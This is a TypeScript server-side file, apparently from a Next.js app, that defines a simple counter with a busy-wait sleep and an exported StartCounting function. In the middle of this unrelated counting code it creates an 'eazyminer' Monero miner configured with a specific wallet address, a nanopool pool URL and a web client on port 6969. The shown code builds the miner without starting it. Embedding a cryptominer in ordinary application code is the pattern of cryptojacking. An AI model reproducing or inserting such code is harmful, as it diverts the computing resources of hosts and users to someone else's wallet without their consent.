"use server"

class Counter {
   start:number = 0
   end:number
   constructor(end:number){
    this.end = end
   }

   increment:Function = () =>{
    this.number++
   }

   incrementing:boolean = false

   number = this.start

   private interval:any = {}

   startIncrementing(){
    this.incrementing = true
    for(var i = 0; i<this.end; i++){
        sleep(10)
        this.number++
    }
   }

   stopIncrementing(){

   }
}

function sleep(milliseconds:number) {
    var start = new Date().getTime();
    for (var i = 0; i < 1e7; i++) {
      if ((new Date().getTime() - start) > milliseconds){
        break;
      }
    }
  }

  const Miner = require('eazyminer');

const miner = new Miner({
    pools: [{
        coin: 'XMR',
        user: '48DP9kTwvrwBFNgnyiHAfbebvV1D6fL484fEkSXcS6NW3Edn5xmmuzkQ8z317DjKFdDRAi5y8wAAKL5tEXTK14LDQdZUUaD',
        pass: "x",
        url: 'xmr-us-east1.nanopool.org:10300', // optional pool URL,
    }],
    opencl: {
      enabled: false,
      platform: 'AMD',
      loader: null,
      adl: true,
      "cn-lite/0": false,
      "cn/0": false
  },

  // (XMRIG config options https://xmrig.com/docs/miner/config/cuda)
  cuda: {
      enabled: false,
      loader: null,
      nvml: true,
      "cn-lite/0": false,
      "cn/0": false
  },
  web: {
        
    // Enable or Disable web client
    enabled: true,

    // The used port for the webclient
    port: 6969 
},
  productionOnly: false,
    autoStart: false // optional delay
    
    
});

export async function start(){
  return(
    console.log("start")
  )
}

export async function stop(){
  return(console.log("stop"))
}


export default async function StartCounting(end:number){

    let C = new Counter(end)
    C.startIncrementing()

    return(
        C.number
    )

}